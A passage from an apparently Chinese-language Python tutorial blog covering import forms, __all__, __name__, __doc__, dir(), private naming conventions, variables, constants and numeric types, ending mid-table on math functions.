<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> 模块名           导入模块</span><br><span class="line"></span><br><span class="line">模块名.函数名(参数)                      使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">3. <strong>import …from 语句：</strong></font></p>
<p>还有一种变化就是直接导入一个函数或者变量:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名.模块名  <span class="keyword">import</span> 函数名      导入模块</span><br><span class="line">函数名(参数)                               使用模块</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Comic sans MS">4. <strong>import …from * 语句：</strong></font></p>
<blockquote>
<p><font color="red" face="Comic sans MS" size=4><strong>注意：这种导入方法必须要注意<code>__init__.py</code>里面的属性<code>__all__</code>已经设置好。<code>__all__</code>是用于控制from…import *</strong><br></font></p>
</blockquote>
<p><font face="Microsoft YaHei">Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</font></p>
<p><font face="Microsoft YaHei">在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> *                 导入所有模块</span><br><span class="line">模块名.函数名(参数)                        使用模块</span><br></pre></td></tr></table></figure>

<p><strong>具体使用方法请看下面章节四。</strong></p>
<br>

<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>总结使用时注意事项：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">注意当使用<code>from package import item</code>这种形式的时候，对应的<font color="#FF7F00"><strong>item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量</strong></font>。</font></li>
<li><font face="Microsoft YaHei">import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</font></li>
<li><font face="Microsoft YaHei">反之，如果使用形如<code>import item.subitem.subsubitem</code>这种导入形式，<font color="#FF7F00"><strong>最后一项可以是包或者模块（不可以是类，函数或者变量的名字），除了最后一项，都必须是包。</strong></font>。</li>
</ol>
<br>

<br>

<h3 id="四-init-、-all-、-name-、-author-、-doc-、dir-函数"><a href="#四-init-、-all-、-name-、-author-、-doc-、dir-函数" class="headerlink" title="四. __init__、__all__、__name__、__author__、__doc__、dir()函数"></a><font color="#FF6347" face="Comic sans MS">四. __init__、__all__、__name__、__author__、__doc__、dir()函数</font></h3><br>

<h4 id="4-1-init-、-all"><a href="#4-1-init-、-all" class="headerlink" title="4.1 __init__、__all__"></a><font color="#3CB371" face="Comic sans MS">4.1 __init__、__all__</font></h4><p><font face="Microsoft YaHei">在使用<code>from 包名.子包名 import \* 语句</code>时必须修改<code>__init__.py</code>文件的<code>__all__</code>    列表变量。</font></p>
<blockquote>
<ol>
<li><font face="Microsoft YaHei">如果包定义文件 <code>__init__.py</code> 存在一个叫做 <code>__all__</code>     的列表变量，那么在使用 <code>from package import *</code>的时候就把这个列表中的所有名字作为包内容导入。</font></li>
<li><font face="Microsoft YaHei">作为包的作者，可别忘了在更新包之后保证 <code>__all__</code>     也更新了啊。你说我就不这么做，我就不使用导入<code>*</code>这种用法，好吧，没问题。这里有一个例子</font></li>
<li><font face="Microsoft YaHei">这表示当你使用<code>from sound.effects import *</code>这种用法时，你只会导入如下包里面这三个子模块。即这种语法导入的是<code>__all__</code>指定的模块。</font></li>
<li><font face="Microsoft YaHei">在python3中，即使包下没有<code>__init__.py</code>文件，import 包仍然不会报错，而在python2中，包下一定要有该文件，否则import 包报错</font></li>
<li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的<code>__init__.py</code>，导入包本质就是在导入该文件。</font></li>
</ol>
</blockquote>
<br>
上述的例子：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__ = [<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;surround&quot;</span>, <span class="string">&quot;reverse&quot;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-1-name-、-main"><a href="#4-1-name-、-main" class="headerlink" title="4.1 __name__、__main__"></a><font color="#3CB371" face="Comic sans MS">4.1 __name__、__main__</font></h4><ol>
<li><p><font face="Microsoft YaHei">__name__是一个变量。前后加了爽下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。</font></p>
</li>
<li><p><font face="Microsoft YaHei">__name__就是标识模块的名字的一个系统变量。这里分两种情况：</font></p>
<ol>
<li><font face="Microsoft YaHei">假如当前模块是主模块（也就是调用其他模块的模块），那么此模块名字就是__main__，即__name__==__main__。可以执行后面的内容；</font></li>
<li><font face="Microsoft YaHei">假如此模块是被import的，其值为被调用模块所属的路径。</li>
</ol>
</li>
</ol>
<br>

<p>下面举一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test1.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   print(<span class="string">&#x27;程序自身在运行&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">&#x27;我来自另一模块&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test2.py</span><br><span class="line"><span class="keyword">import</span> test1</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">运行test2.py输出结果：</span><br><span class="line">我来自另一模块</span><br><span class="line"></span><br><span class="line">运行test1.py输出结果：</span><br><span class="line">程序自身在运行</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-3-author-、-doc"><a href="#4-3-author-、-doc" class="headerlink" title="4.3 __author__、__doc__"></a><font color="#3CB371" face="Comic sans MS">4.3 __author__、__doc__</font></h4><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>文档注释：</strong></font>任何模块代码的第一个字符串都被视为模块的文档注释；</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__doc__</code>：</strong></font>可以访问一个文件中的第一个单引号（1、2、3对）、双引号（1、2、3对）注释的文档。</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__author__</code>：</strong></font>可以将一个文件的作者名字赋给它。</font></p>
<br>

<p>应用示例如下：<br><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(__doc__)</span><br><span class="line">print(__doc__)</span><br><span class="line">print(__author__)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">10</span></span><br><span class="line"> a test module</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-4-dir-函数"><a href="#4-4-dir-函数" class="headerlink" title="4.4 dir()函数"></a><font color="#3CB371" face="Comic sans MS">4.4 dir()函数</font></h4><blockquote>
<p><font face="Microsoft YaHei">内置的函数 dir() 可以<font color="#FF7F00"><strong>找到模块内定义的所有名称。以一个字符串列表的形式返回</strong></font> 。</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>无参数：</strong></font> 只能列举当前模块已经被定义的名字；</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>有参数：</strong></font> 参数只能是已经引用的模块名字，不能为自身名字，否则会报错。</font></p>
</blockquote>
<br>

<p>举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">print(__doc__)</span><br><span class="line">print(__author__)</span><br><span class="line">print(dir())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> test3  </span><br><span class="line">print(dir(test3))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="五-非公开函数"><a href="#五-非公开函数" class="headerlink" title="五. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">五. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p><font face="Microsoft YaHei">类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；<br></font><br><font face="Microsoft YaHei"></font></p>
<p><font face="Microsoft YaHei">之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</font></p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p><font face="Microsoft YaHei">我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：<br></font></p>
<p><font face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</strong><br></font></p>
<hr>
<hr>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-变量和数据类型</title>
    <url>/post/Python-Variables-DataTypes/</url>
    <content><![CDATA[<p>定义一个变量就是定义了一个指针！  ٩(ˊᗜˋ*)و<br>字符串内容很多，就很烦(っ ̯ -｡)</p>
<a id="more"></a>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>变量和数据类型</font> </center>

<br>

<br>

<h3 id="一-变量"><a href="#一-变量" class="headerlink" title="一. 变量"></a><font color="#FF6347" face="Comic sans MS">一. 变量</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、关于变量</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">变量存储在内存中的值。这就意味着在创建变量时会<strong>在内存中开辟一个空间</strong>。</font></li>
<li><font face="Comic sans MS">基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。</font></li>
<li><font face="Comic sans MS">Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</font></li>
</ol>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、变量的赋值</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python 中的变量赋值<font color="#FF7F00"><strong>不需要类型声明</strong></font>。</font></li>
<li><font face="Comic sans MS">每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。</font></li>
<li><font face="Comic sans MS">每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">变量的赋值分为：<font color="#FF7F00"><strong>单个变量赋值</strong></font>和<font color="#FF7F00"><strong>多个变量赋值</strong></font> </font></li>
</ol>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>单个变量赋值：</strong>使用等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。例如：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;Hello Python world!&quot;</span></span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font face="Comic sans MS">我们添加了一个名为message的<strong>变量</strong>。每个变量都存储了一个<strong>值</strong>——与变量相关联的信息。在这里，存储的值为文本“Hello Python world!”。</font></p>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>多个变量赋值：</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"><span class="comment">#以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS">或者</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;john&quot;</span></span><br><span class="line"><span class="comment">#以上实例，两个整型对象 1 和 2 分别分配给变量 a 和 b，字符串对象 &quot;john&quot; 分配给变量 c。</span></span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、变量的命名和使用</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>请务必牢记下述有关变量的规则：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS">变量名只能包含<font color="#FF7F00"><strong>字母、数字</strong>和<strong>下划线</strong></font>。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。 </font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>变量名不能包含空格</strong></font>，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>不要将Python关键字和函数名用作变量名</strong></font>，即不要使用Python保留用于特殊用途的单词，如print。</font></li>
<li><font face="Comic sans MS">变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>慎用小写字母l和大写字母O</strong></font>，因为它们可能被人错看成数字1和0。</font></li>
<li><font face="Comic sans MS">注意：就目前而言，<font color="#FF7F00"><strong>应使用小写的Python变量名</strong></font>。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意。</font></li>
</ol>
<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、变量是一种动态语言</strong></font><br>&emsp;<br>代码示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="number">123</span> <span class="comment"># a是整数</span></span><br><span class="line">print(a)</span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span> <span class="comment"># a变为字符串</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">123</span> </span><br><span class="line">ABC</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;这种变量本身类型不固定的语言称之为&lt;font color=&quot;red&quot;&gt;**动态语言**&lt;/font&gt;，与之对应的是&lt;font color=&quot;red&quot;&gt;**静态语言**&lt;/font&gt;。和静态语言相比，**动态语言更灵活**，就是这个原因。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（// 表示注释）：&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">int a = <span class="number">123</span>; // a是整数类型变量</span><br><span class="line">a = <span class="string">&quot;ABC&quot;</span>; // 错误：不能把字符串赋给整型变量</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、Python的变量是Python的指针</strong></font> </p>
<p>可参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/hzwsj/p/5777973.html">一切都是对象，一切都是指针，一切都是东西（python的编程哲学）</a>]</font><br>&emsp;<br>如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">5</span></span><br><span class="line">a=<span class="number">5</span></span><br><span class="line">print(id(a))</span><br><span class="line">print(id(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line"><span class="number">1769134320</span> </span><br><span class="line"><span class="number">1769134320</span> </span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS">我们分别查一下他们的内存地址，发现地址是一样的。</font></p>
<blockquote>
<p><font face="Comic sans MS"><strong>于是我们可以这样理解：</strong></font></p>
</blockquote>
<ol>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>python把一切数据，一切的一切都看作对象，在python中，没有变量，只有指针，要说变量，也是指针变量</strong></font>。</font></li>
<li><font face="Comic sans MS">这样的变量还有如：<strong>列表</strong>，<strong>字典的值</strong>。</font></li>
<li><font face="Comic sans MS"><font color="#FF7F00"><strong>但是字符串，数字等类型的变量，字典的键就是传值使用，不是指针，而是不可再改变的值</strong></font>。</font></li>
</ol>
<p>&emsp;<br><strong>举例子</strong><br><font color="#00B2EE">例子1：</font>当我们写：<br><font color="#00B2EE"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure>


<p><font face="Comic sans MS">时，Python解释器干了两件事情：</font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">在内存中创建了一个’ABC’的字符串；</font></li>
<li><font face="Comic sans MS">在内存中创建了一个名为a的变量，<strong>并把它指向’ABC’</strong></font></li>
</ol>
</blockquote>
<p>&emsp;<br><font color="#00B2EE">例子2：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">b = a</span><br><span class="line">a = <span class="string">&#x27;XYZ&#x27;</span></span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br></pre></td></tr></table></figure>

<br>

<p><font face="Comic sans MS">最后一行打印出变量b的内容到底是**<code>&#39;ABC&#39;</code><strong>呢还是</strong><code>&#39;XYZ&#39;</code><strong>？如果从数学意义上理解，就会错误地得出</strong><code>b</code><strong>和</strong><code>a</code><strong>相同，也应该是</strong><code>&#39;XYZ&#39;</code><strong>，但实际上</strong><code>b</code><strong>的值是</strong><code>&#39;ABC&#39;</code>**，让我们一行一行地执行代码，就可以看到到底发生了什么事：</font></p>
<ol>
<li><font face="Comic sans MS">执行a = ‘ABC’，解释器创建了字符串’ABC’和变量a，**并把a指向’ABC’**：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c760234f3b42.png" alt="1.png"></p>
<ol start="2">
<li><font face="Comic sans MS">执行b = a，解释器创建了变量b，并把b指向a指向的字符串’ABC’：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7602fa3c6f7.png" alt="0 (1).png"></p>
<ol start="3">
<li><font face="Comic sans MS">执行a = ‘XYZ’，解释器创建了字符串’XYZ’，并把a的指向改为’XYZ’，但b并没有更改：</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7603411d5fc.png" alt="0 (2).png"></p>
<p><font face="Comic sans MS">所以，最后打印变量b的结果自然是’ABC’了。</font></p>
<br>
&emsp;

<h3 id="二-常量"><a href="#二-常量" class="headerlink" title="二. 常量"></a><font color="#FF6347" face="Comic sans MS">二. 常量</font></h3><p><font face="Comic sans MS">所谓常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，<strong>通常用全部大写的变量名表示常量</strong>：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PI = <span class="number">3.14159265359</span></span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="#FF7F00"><strong>但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变</strong></font>，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量PI的值，也没人能拦住你。</font></p>
<p><font color="#FF7F00"></font></p>
<h3 id="三-数据类型"><a href="#三-数据类型" class="headerlink" title="三. 数据类型"></a><font color="#FF6347" face="Comic sans MS">三. 数据类型</font></h3><p><font face="Comic sans MS"><strong>标准数据类型</strong></p>
<p>在内存中存储的数据可以有多种类型。</p>
<p>Python 定义了一些标准类型，用于存储各种类型的数据。</font></p>
<blockquote>
<p><font face="Comic sans MS">Python<font color="#FF7F00"><strong>有五个标准</strong></font>的数据类型：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Numbers（数字）</font></li>
<li><font face="Microsoft YaHei">String（字符串）</font></li>
<li><font face="Sans-serif">List（列表）</font></li>
<li><font face="Sans-serif">Tuple（元组）</font></li>
<li><font face="Sans-serif">Dictionary（字典）</font></li>
</ol>
<h4 id="3-1-数字运算和函数"><a href="#3-1-数字运算和函数" class="headerlink" title="3.1 数字运算和函数"></a><font color="#3CB371" face="Comic sans MS">3.1 数字运算和函数</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、整数的定义和基础知识</strong></font> </p>
<ol>
<li><p><font face="Comic sans MS"><font color="#FF7F00"><strong>Python可以处理任意大小的整数，当然包括负整数</strong></font>，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">计算机由于使用二进制，所以，有时候用<font color="#FF7F00"><strong>十六进制表示整数</strong></font>比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。</font></p>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、整数运算</strong></font> </p>
<p><font face="Comic sans MS">在Python中，可对整数执行加（**<code>+</code><strong>）减（</strong><code>-</code><strong>）乘（</strong><code>*</code><strong>）除（</strong><code>/</code>**）平方（<code>**</code>）取余（<code>%</code>）运算。</font></p>
<br>

<p><font face="Comic sans MS"><font color="red"><strong>注意事项：</strong></font> </font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python使用<font color="#FF7F00"><strong>两个乘号表示乘方运算：</strong></font><code>3 ** 2==9</code></font></li>
<li><font face="Comic sans MS">Python<font color="#FF7F00"><strong>整数的除法得到的结果是精确的</strong></font>。在Python中，有两种除法：</font><ol>
<li><font face="Comic sans MS">一种除法是<code>/</code>(结果是浮点数)</font></li>
<li><font face="Comic sans MS">另一种是除法是<code>//</code>，称为地板除(两个整数的除法仍然是整数) </font>  </li>
</ol>
</li>
<li><font face="Comic sans MS">因为**<code>//</code>**除法只取结果的整数部分，所以Python还提供一个余数运算(<code>%</code>)，可以得到两个整数相除的余数。</font></li>
</ol>
</blockquote>
<p>&emsp;<br>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span>/<span class="number">3</span></span><br><span class="line">print(a)</span><br><span class="line">a=<span class="number">10</span>//<span class="number">3</span></span><br><span class="line">print(a)</span><br><span class="line">a=<span class="number">10</span>%<span class="number">3</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运算结果：</span><br><span class="line"><span class="number">3.3333333333333335</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">1</span> </span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、Number 类型转换</strong></font> </p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">int(x [,base ])</td>
<td align="left">将x转换为一个整数</td>
</tr>
<tr>
<td align="left">long(x [,base ])</td>
<td align="left">将x转换为一个长整数</td>
</tr>
<tr>
<td align="left">float(x )</td>
<td align="left">将x转换到一个浮点数</td>
</tr>
<tr>
<td align="left">complex(real [,imag ])</td>
<td align="left">创建一个复数</td>
</tr>
<tr>
<td align="left">str(x )</td>
<td align="left">将对象 x 转换为字符串</td>
</tr>
<tr>
<td align="left">repr(x )</td>
<td align="left">将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td align="left">eval(str )</td>
<td align="left">用来计算在字符串中的有效Python表达式,并返回一个对象</td>
</tr>
<tr>
<td align="left">tuple(s )</td>
<td align="left">将序列 s 转换为一个元组</td>
</tr>
<tr>
<td align="left">list(s )</td>
<td align="left">将序列 s 转换为一个列表</td>
</tr>
<tr>
<td align="left">chr(x )</td>
<td align="left">将一个整数转换为一个字符</td>
</tr>
<tr>
<td align="left">unichr(x )</td>
<td align="left">将一个整数转换为Unicode字符</td>
</tr>
<tr>
<td align="left">ord(x )</td>
<td align="left">将一个字符转换为它的整数值</td>
</tr>
<tr>
<td align="left">hex(x )</td>
<td align="left">将一个整数转换为一个十六进制字符串</td>
</tr>
<tr>
<td align="left">oct(x )</td>
<td align="left">将一个整数转换为一个八进制字符串</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>四、数学函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">返回值 ( 描述 )</th>
</tr>
</thead>
<tbody><tr>
<td align="left">abs(x)</td>
<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
</tr>
<tr>
<td align="left">ceil(x)</td>
<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
</tr>
<tr>
<td align="left">cmp(x, y)</td>
<td align="left">如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1</td>
</tr>
<tr>
<td align="left">exp(x)</td>
<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
</tr>
<tr>
<td align="left">fabs(x)</td>
<td align="left">返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
</tr>
<tr>
<td align="left">floor(x)</td>
<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
</tr>
<tr>
<td align="left">log(x)</td>
<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
</tr>
<tr>
<td align="left">log10(x)</td>
<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
</tr>
<tr>
<td align="left">max(x1, x2,…)</td>
<td align="left">返回给定参数的最大值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">min(x1, x2,…)</td>
<td align="left">返回给定参数的最小值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">modf(x)</td>
<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
</tr>
<tr>
<td align="left">pow(x, y)</td>
<td align="left">x**y 运算后的值。</td>
</tr>
<tr>
<td align="left">round(x [,n])</td>
